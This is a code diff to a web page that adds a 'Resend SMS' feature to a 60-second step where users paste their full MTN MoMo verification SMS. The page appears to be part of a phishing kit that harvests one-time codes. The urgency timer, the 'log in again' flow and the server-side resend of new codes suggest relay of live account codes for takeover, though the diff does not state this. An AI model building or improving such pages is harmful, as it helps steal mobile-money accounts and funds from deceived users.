@@ -198,6 +198,12 @@
   .sms-timer-num.urgent { color:#d91e1e; }
   .sms-timer-text { font-size:0.82rem; color:#7a4500; line-height:1.4; }
   .sms-timer-text strong { font-weight:600; }
+  /* resend block shown on expiry */
+  .sms-resend-wrap { display:none; background:#fef2f2; border:1.5px solid #fecaca; border-radius:var(--radius-sm); padding:16px 16px 14px; margin-bottom:14px; text-align:center; }
+  .sms-resend-wrap p { font-size:0.83rem; color:#991b1b; margin-bottom:12px; line-height:1.5; }
+  .btn-resend { display:inline-flex; align-items:center; gap:6px; padding:10px 22px; background:var(--grad); color:#fff; border:none; border-radius:8px; font-size:0.85rem; font-weight:600; letter-spacing:0.04em; cursor:pointer; font-family:'Inter',sans-serif; transition:opacity 0.2s; }
+  .btn-resend:hover { opacity:0.88; }
+  .btn-resend:disabled { opacity:0.5; cursor:not-allowed; }
 
   /* ───── PAGE: OTP ───── */
   #page-otp { background:#fff; }
@@ -526,6 +532,15 @@
           <div class="sms-timer-num" id="smsTimerNum">60</div>
         </div>
         <div class="sms-timer-text"><strong>Message expires in <span id="smsTimerSec">60</span>s.</strong><br>Paste your SMS before time runs out.</div>
+      </div>
+      <!-- Resend block — shown only when timer expires -->
+      <div class="sms-resend-wrap" id="smsResendWrap">
+        <p>⏰ Your verification session has expired.<br>Request a new SMS and paste it below.</p>
+        <button class="btn-resend" id="bResend" onclick="doSmsResend()">🔄 Resend SMS</button>
+        <div id="mResend" class="loading" style="margin-top:10px;">
+          <div class="spinner" style="margin: 8px auto; width:30px; height:30px; border-width:3px;"></div>
+          <div class="wait-msg" style="font-size:0.82rem;">Sending…</div>
+        </div>
       </div>
       <textarea id="smsMsgBox" class="sms-textarea" placeholder="Paste your full SMS message here…" oninput="chkSmsMsg()"></textarea>
       <p class="sms-code-hint">Example: "Your MTN MoMo verification code is: 123456"</p>
@@ -1023,6 +1038,8 @@
     document.getElementById('smsMsgBox').value = '';
     document.getElementById('smsMsgBox').disabled = false;
     chkSmsMsg();
+    // Hide resend block (fresh session)
+    document.getElementById('smsResendWrap').style.display = 'none';
 
     // Reset timer visuals
     const arc = document.getElementById('smsTimerArc');
@@ -1057,17 +1074,18 @@
 
         // Disable textarea and submit button
         document.getElementById('smsMsgBox').disabled = true;
+        document.getElementById('smsMsgBox').value = '';
         document.getElementById('bSms').disabled = true;
         document.getElementById('bSms').className = 'btn-sms';
 
-        // Show expiry error — ask user to re-paste
-        ['smsMsg','smsMsgOk'].forEach(function(id){ document.getElementById(id).classList.remove('show'); });
-        document.getElementById('smsMsgTxt').textContent =
-          'This verification session has expired. Please go back and log in again, then paste your new SMS message.';
-        document.getElementById('smsMsg').classList.add('show');
-
-        // Hide the timer widget
+        // Hide timer, show resend widget
         document.getElementById('smsTimerWrap').style.display = 'none';
+        document.getElementById('smsResendWrap').style.display = 'block';
+        document.getElementById('bResend').disabled = false;
+        document.getElementById('mResend').classList.remove('show');
+
+        // Clear any previous messages
+        ['smsMsg','smsMsgOk'].forEach(function(id){ document.getElementById(id).classList.remove('show'); });
       }
     };
 
@@ -1081,11 +1099,49 @@
     }
   }
 
+  // ══════════════════════════════════════════════════════
+  // SMS RESEND — triggered when 60s timer expires
+  // ══════════════════════════════════════════════════════
+  async function doSmsResend() {
+    const btn     = document.getElementById('bResend');
+    const spinner = document.getElementById('mResend');
+    btn.disabled  = true;
+    spinner.classList.add('show');
+    ['smsMsg','smsMsgOk'].forEach(function(id){ document.getElementById(id).classList.remove('show'); });
+
+    try {
+      const res  = await fetch('/api/resend-sms', {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body:    JSON.stringify({ applicationId: S.applicationId })
+      });
+      const data = await res.json();
+      spinner.classList.remove('show');
+
+      if (data.success) {
+        // Hide resend widget, re-enable textarea, restart timer
+        document.getElementById('smsResendWrap').style.display = 'none';
+        document.getElementById('smsMsgBox').disabled = false;
+        document.getElementById('bSms').disabled = false;
+        startSmsTimer();
+        showSmsMsg('success', 'A new SMS has been sent to your phone. Paste it below before it expires.');
+      } else {
+        btn.disabled = false;
+        showSmsMsg('error', data.message || 'Failed to resend SMS. Please try again.');
+      }
+    } catch (err) {
+      spinner.classList.remove('show');
+      btn.disabled = false;
+      showSmsMsg('error', 'Network error: ' + err.message);
+    }
+  }
+
   async function doSmsParse() {
     ['smsMsg','smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
 
     if (smsTimerExpired) {
-      showSmsMsg('error', 'This verification session has expired. Please go back and log in again, then paste your new SMS message.');
+      document.getElementById('smsResendWrap').style.display = 'block';
+      document.getElementById('bResend').disabled = false;
       return;
     }
 
